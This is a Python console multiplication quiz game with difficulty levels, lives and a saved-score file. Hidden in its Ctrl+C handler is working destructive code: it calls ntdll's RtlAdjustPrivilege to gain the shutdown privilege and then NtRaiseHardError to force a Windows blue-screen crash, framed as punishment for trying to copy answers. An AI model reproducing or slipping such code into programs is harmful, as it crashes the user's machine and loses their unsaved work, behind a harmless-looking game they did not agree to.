import random
import time
import ctypes
print("Welcome to Math Multiplication Quiz Game!!\nMenu:")
while True:
    print('\n[1] = Play\n[2] = See Previous Run\n[3] = Delete Run\n[4] = Exit\n')
    try:
        Choice = int(input("Choice: "))
        match Choice:
            case 2:
                def Saved():
                    File = open("Score.txt","r")
                    O = str(File.read())
                    if O == '':
                        print("\nYou haven't start a single run yet\n")
                    else:
                        print(f"\nlast run:\n\n{O}\n")
                    File.close()
                Saved()
            case 1:  
                def game():
                    Difficulty = "LMAO"
                    Life = 0
                    FS = 0
                    Save = "LMAO"
                    print("\nDifficulty:\n")
                    X = 0
                    Y = 0
                    Check1 = ['Easy','Normal','Hard','Lunatic','EX']
                    Check2 = ['Y','y','N','n']
                    print("Easy [0.5x]\nNormal [1x]\nHard [2x]\nLunatic [4x]\nEX [10x]\n")
                    while Difficulty not in Check1:
                        Difficulty = input("Select: ")
                    match Difficulty:
                        case "Easy":
                            Small = 10
                            Big = 100
                            Multi = 0.5
                        case "Normal":
                            Small = 100
                            Big = 1000
                            Multi = 1.0
                        case "Hard":
                            Small = 1000
                            Big = 10000
                            Multi = 2.0
                        case "Lunatic":
                            Small = 10000
                            Big = 100000
                            Multi = 4.0
                        case "EX":
                            Small = 100000
                            Big = 1000000000000
                            Multi = 10.0
                    Life = random.randint(1,10)
                    print(f'Life = {Life}\n')
                    correct = 0
                    while Life > 0:
                        try:
                            Y = random.randint(Small, Big)
                            X = random.randint(Small, Big)
                            Question = str(X * Y)
                            print(f'What is {X} * {Y}?\n')
                            print(f'Life Left = {Life}')
                            Answer = input("Answer: ")
                            if Answer == Question:
                                print("\nCorrect \n+ 100 Point\n")
                                correct += 1
                            else:
                                print ("\nWrong")
                                Life -= 1
                        except KeyboardInterrupt:
                            print("\n\nTrying to copy but failed?\nPunisment: I will kill the PC via BSoD\n")
                            time.sleep(1)
                            ntdll = ctypes.windll.ntdll
                            prev_value = ctypes.c_bool()
                            res = ctypes.c_ulong()
                            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                            if not ntdll.NtRaiseHardError(0xDEADBEEF, 0, 0, 0, 6, ctypes.byref(res)):
                                print("BSOD Successfull!")
                            else:
                                print("BSOD Failed...")
                    print ("Game over")
                    FS = (correct * 1000) * Multi
                    print(f'Final score = {FS}\n')
                    while Save not in Check2:
                        Save = input("Save? : [Y/N]")
                    if Save == "Y":
                        Name = input("Name: ")
                        file = open("Score.txt","a")
                        file.write(f'Player = {Name}\nScore = {FS}\nDifficulty = {Difficulty}')
                        file.close()
                        print("Saved\n")
                    else:
                        return()
                game()
            case 3:
                FP = open ('Score.txt','w')
                FP.write("")
                FP.close()
                print("\nCleared")
            case 4:
                break
            case _:
                print("Invalid Choices")
    except Exception:
        print("That's not even a number")
    except KeyboardInterrupt:
        print("You're funny sometimes XD")